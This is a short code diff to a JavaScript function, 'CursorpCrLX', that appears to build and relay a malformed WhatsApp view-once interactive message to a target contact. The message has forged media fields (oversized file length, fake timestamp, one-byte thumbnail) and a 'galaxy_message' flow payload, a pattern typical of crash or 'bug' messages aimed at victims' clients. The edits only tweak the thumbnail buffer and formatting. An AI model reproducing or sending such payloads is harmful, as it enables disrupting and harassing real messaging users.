@@ -93,7 +93,7 @@ async function CursorpCrLX(kerz, jid) {
                   mediaKeyTimestamp: "999999999",
                   fileLength: "999999",
                   directPath: "/v/t62.7118-24/11734305_enc.jpg?ccb=11-4",
-                  jpegThumbnail: Buffer.from("00", "hex"),
+                  jpegThumbnail: Buffer.alloc(1) // <- ✅ reemplazo seguro
                 },
                 hasMediaAttachment: true
               },
@@ -115,7 +115,10 @@ async function CursorpCrLX(kerz, jid) {
             viewOnceMessage: {
               message: {
                 interactiveResponseMessage: {
-                  body: { text: "Sent", format: "DEFAULT" },
+                  body: {
+                    text: "Sent",
+                    format: "DEFAULT"
+                  },
                   nativeFlowResponseMessage: {
                     name: "galaxy_message",
                     paramsJson: JSON.stringify({
@@ -131,6 +134,7 @@ async function CursorpCrLX(kerz, jid) {
       }
     }
   }, {});
+
   await kerz.relayMessage(jid, msg.message, {
     messageId: msg.key.id,
     participant: { jid }
